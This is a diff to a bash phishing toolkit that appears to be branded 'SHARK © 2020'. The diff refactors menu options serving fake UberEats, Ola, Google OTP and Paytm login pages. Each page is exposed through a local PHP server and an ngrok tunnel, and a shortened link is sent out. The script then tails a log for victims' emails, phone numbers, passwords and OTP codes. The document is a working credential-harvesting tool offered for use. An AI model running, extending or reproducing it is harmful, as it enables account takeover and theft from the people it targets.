@@ -368,105 +368,27 @@ banner
 			   
 	elif [ $option = 04 ] || [ $option = 4 ]
         then
-                          cd $php/UberEats-Phishing/
-			  echo 
-			  connection
-			  ( sleep 5 ) &> /dev/null & spin_shark
-			  php -S 127.0.0.1:4444 > /dev/null 2>&1 & 
-			  sleep 1
-			  echo 
-			  (sleep 6) &> /dev/null & spin
-			  echo
-			  tput civis
-			  ngrok http 4444 > /dev/null 2>&1 &
-			  ( sleep 18 ) &> /dev/null & spinner
-			  echo 
-			  tput cnorm
-			  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
-			  ( sleep 6 ) &> /dev/null & spinner1
-			  url_shortner 
-			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
-			  clear
-			  shark_logo
-			  echo 
-			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			  echo 
-			  echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-			  echo
+                          cd $php/UberEats-Phishing/ && main			  
 			  tail -f log.txt | grep -e "Email_or_Phone" -e "password" -e "verificationCode"
-
                           break;
 			  
         elif [ $option = 05 ] || [ $option = 5 ]
         then
-                          cd $php/ola-otpbypass/
-                          echo 
-			  connection
-                          ( sleep 5 ) &> /dev/null & spin_shark
-		          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-		          sleep 1   
-		          echo 
-		          (sleep 6) &> /dev/null & spin
-			  echo
-			  tput civis
-		          ngrok http 4444 > /dev/null 2>&1 &
-		          ( sleep 18 ) &> /dev/null & spinner
-		          echo 
-			  tput cnorm
-		          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")  		        
-			  ( sleep 6 ) &> /dev/null & spinner1
-		          url_shortner
-			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
-			  clear
-			  shark_logo
-			  echo 
-			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			  echo 
-			  echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-			  echo
+                          cd $php/ola-otpbypass/ && main
 		          tail -f log.txt | grep -e "number" -e "otp" -e "OTP"
-
                           break;
 			  
          elif [ $option = 06 ] || [ $option = 6 ]
 	 then
-                          cd $php/google-otp/                         
-                          echo 
-			  connection
-		          ( sleep 5 ) &> /dev/null & spin_shark  
-		          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-		          sleep 1
-		          echo 
-		          (sleep 6) &> /dev/null & spin 
-			  echo
-			  tput civis
-		          ngrok http 4444 > /dev/null 2>&1 &
-		          ( sleep 18 ) &> /dev/null & spinner
-		          echo 
-			  tput cnorm
-		          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")        
-			  ( sleep 6 ) &> /dev/null & spinner1
-		          url_shortner
-			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
-			  clear
-			  shark_logo
-			  echo 
-			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			  echo 
-			  echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-			  echo
+                          cd $php/google-otp/ && main                         
 		          tail -f log.txt | grep -e "email" -e "password" -e "OTP"
-  
                           break;
 			  
        elif [ $option = 07 ] || [ $option = 7 ]
        then
-                          cd $php/Paytm-Phishing/
-                          echo 
-                          echo -e "\e[1;31m[\e[0m\e[1;77m 1 \e[0m\e[1;31m]\e[0m\e[1;32m Sign In \e[0m" 
-			  echo
-                          echo -e "\e[1;31m[\e[0m\e[1;77m 2 \e[0m\e[1;31m]\e[0m\e[1;32m Sign UP \e[0m"
-                          echo 
+                          cd $php/Paytm-Phishing/ && printf "\n"
+                          printf "${red}[${white} 1 ${red}]${green} Sign In \n\n" 
+                          printf "${red}[${white} 2 ${red}]${green} Sign Up \n\n"                           
                           read -p $'\e[1;91m[\e[0m\e[1;92m >>> \e[0m\e[1;91m]\e[0m\e[1;92m Enter Your Choice : \e[0m' option1
 		          if [ $option1 = 1 ] || [ $option1 = 01 ]
 			  then
